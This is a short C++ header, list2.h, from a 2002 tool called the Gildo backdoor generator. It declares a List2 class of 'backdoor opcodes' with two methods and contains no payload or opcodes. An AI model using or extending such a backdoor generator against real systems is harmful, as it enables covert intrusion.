/* list/list2.h   the second backdoor opcodes list
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under
 * the licence given in the file "Licence" distributed in the
 * Gbkdoor archive.
 */



#ifndef _list2_h_
#define _list2_h_



#include "../list.h"

//here is define of LIST1_BASH_ARGC 
#include "../define.h"



class List2 : public List
{
public:
virtual void DumpHelp(const char* file) const;
virtual int AdjustEntry(int which, unsigned int oldentry,unsigned int addr);
  List2();
  ~List2();
};












#endif

